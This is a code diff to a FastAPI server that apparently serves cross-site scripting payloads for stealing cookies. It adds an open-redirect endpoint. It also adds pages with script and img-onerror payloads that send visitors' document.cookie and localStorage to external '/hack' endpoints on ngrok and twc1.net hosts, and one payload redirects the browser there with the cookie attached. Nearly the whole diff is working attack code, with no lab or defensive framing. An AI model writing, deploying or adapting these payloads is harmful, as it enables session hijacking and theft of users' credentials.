@@ -19,6 +19,40 @@ app.add_middleware(
 
 data = []
 
+l = []
+
+
+
+@app.get("/redirect")
+def redir(url: str):
+    return RedirectResponse(url)
+
+
+
+@app.get("/new")
+def redir():
+    return HTMLResponse(
+        """
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Document</title>
+        </head>
+        <body>
+            <img src=x onerror=this.src='https://a259-159-255-36-14.ngrok-free.app/hack?'+document.cookie;>
+        </body>
+        </html>        
+        """
+    )
+
+@app.get("/client_info/{id}")
+def get_cookie(id: int):
+    
+    return HTMLResponse(l[id])
+
+
 @app.get("/client_info")
 def get_cookie(request: Request):
     client_host = request.client.host
@@ -34,8 +68,7 @@ def get_cookie(request: Request):
     state = request.state
     print(client_host, client_port, headers, cookies, query_params, path_params, method, url, base_url, scope, state)
 
-    return HTMLResponse(
-        f"""
+    l.append(f"""
         <!DOCTYPE html>
         <html lang="en">
         <head>
@@ -56,10 +89,12 @@ def get_cookie(request: Request):
             <p>Scope: {scope}</p>
             <p>State: {state}</p>
             <script>fetch(`https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${{document.cookie}}`)</script>
+            <script>fetch(`https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${{localStorage}}`)</script>
         </body>
         </html>
-        """
-    )
+        """)
+
+    return HTMLResponse(l[-1])
 
 @app.get("/")
 def get_cookie(request: Request):
@@ -74,7 +109,7 @@ def get_cookie(request: Request):
             <title>Document</title>
         </head>
         <body>
-            <script>fetch(`https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${document.cookie}`)</script>
+            <script>document.location = 'https://080b-159-255-36-14.ngrok-free.app/hack?cookie='+document.cookie</script>
         </body>
         </html>
         """
